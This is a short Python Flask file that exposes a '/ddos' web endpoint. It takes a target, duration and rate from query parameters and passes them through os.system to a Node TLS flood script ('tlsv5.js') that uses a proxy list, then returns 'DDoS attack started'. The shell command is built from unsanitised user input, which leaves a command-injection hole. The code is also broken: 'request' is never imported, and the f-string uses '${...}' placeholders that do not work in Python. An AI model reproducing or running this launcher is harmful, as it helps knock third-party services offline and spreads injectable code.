from flask import Flask
import os

app = Flask(__name__)

@app.route('/ddos')
def ddos():
    target = request.args.get('target', 'example.com')
    duration = request.args.get('duration', '10')
    rate = request.args.get('rate', '100')

    command = f"node tlsv5.js ${target} ${duration} ${rate} 25 p.txt"
    os.system(command)

    return 'DDoS attack started'

if __name__ == '__main__':
    app.run(host='localhost', port=3000)
